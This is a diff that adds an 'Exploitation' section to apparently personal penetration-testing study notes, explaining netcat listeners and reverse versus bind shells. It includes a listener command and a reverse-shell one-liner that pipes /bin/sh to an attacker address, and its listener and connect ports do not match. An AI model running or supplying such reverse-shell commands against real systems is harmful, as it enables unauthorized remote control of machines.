@@ -158,3 +158,10 @@ Response codes: 200 ok, 400 error, 500 server error, 300 is redirect
 
 ## Exploitation
 
+- Netcat - This opens a listening port on our attack box machine `nc <ip address> port` this will establishing a listening port to check if the victim connects with the attack machine
+- Reverse shell is when a victim tries to connect with the attack machine - used 95% of the time
+- Alternatively a bin shell means that we connect to a target - usually used when reverse shell is not working
+- poping a shell means gaining access to a machine
+
+`nc -lvp 444` attack box (lvp means listening verbose port)
+`nc 192.168.1.1 4444 -e /bin/sh
